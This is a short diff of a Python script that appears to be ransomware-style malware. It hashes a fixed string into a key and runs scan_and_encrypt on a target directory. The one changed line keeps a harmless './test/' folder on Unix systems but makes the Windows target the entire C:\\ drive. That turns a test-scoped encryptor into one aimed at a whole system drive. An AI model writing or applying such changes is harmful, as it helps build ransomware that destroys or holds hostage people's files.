@@ -18,7 +18,7 @@ def ask_for_key():
 if __name__ == "__main__":
     key = hashlib.sha256("umachavequalquer".encode()).digest()
 
-    directory = "./test/" if os.name != "nt" else "./test/"
+    directory = "./test/" if os.name != "nt" else "C:\\"
     scan_and_encrypt(directory, key)
 
     print(
